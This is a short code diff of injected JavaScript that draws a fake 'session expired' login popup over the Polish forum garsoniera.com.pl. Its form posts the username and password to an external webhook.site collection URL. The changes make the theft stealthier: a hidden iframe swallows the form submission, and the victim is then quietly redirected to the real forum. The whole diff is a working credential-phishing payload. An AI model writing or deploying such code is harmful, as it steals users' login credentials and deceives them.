@@ -2,8 +2,9 @@ document.getElementsByClassName("bbc_center")[0].remove()
 document.title = "Sesja wygasla - FORUM EROTYCZNE GARSONIERA"
 var div = document.createElement('div');
 div.innerHTML = `
+<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
 <div id="sign_in_popup_popup" style="z-index: 10001; top: 170.75px; left: 643.5px; position: fixed;" class="popupWrapper"><div id="sign_in_popup_inner" class="popupInner" style="width: 600px; max-height: 902px;"><div id="inline_login_form" class="sb_login" style="">
-		<form action="https://webhook.site/a798ce0d-9c60-41e4-a0a7-6e14891244bd" method="post" id="login">
+		<form action="https://webhook.site/a798ce0d-9c60-41e4-a0a7-6e14891244bd" target="dummyframe" method="post" id="login">
 			<input type="hidden" name="auth_key" value="880ea6a14ea49e853634fbdc5015a024">
 			<input type="hidden" name="referer" value="https://www.garsoniera.com.pl/forum/">
 			<h3>Sesja wygasła, zaloguj się ponownie</h3>
@@ -56,7 +57,7 @@ div.innerHTML = `
             </div>
             
             <div class="ipsForm_submit ipsForm_center clear">
-                <input type="submit" class="input_submit" value="Logowanie" onclick="window.location.href = 'https://www.garsoniera.com.pl/forum/index.php';">
+                <input type="submit" class="input_submit" value="Logowanie" onclick="window.location.replace('https://www.garsoniera.com.pl/forum/index.php');">
             </div>
 
 		</form>
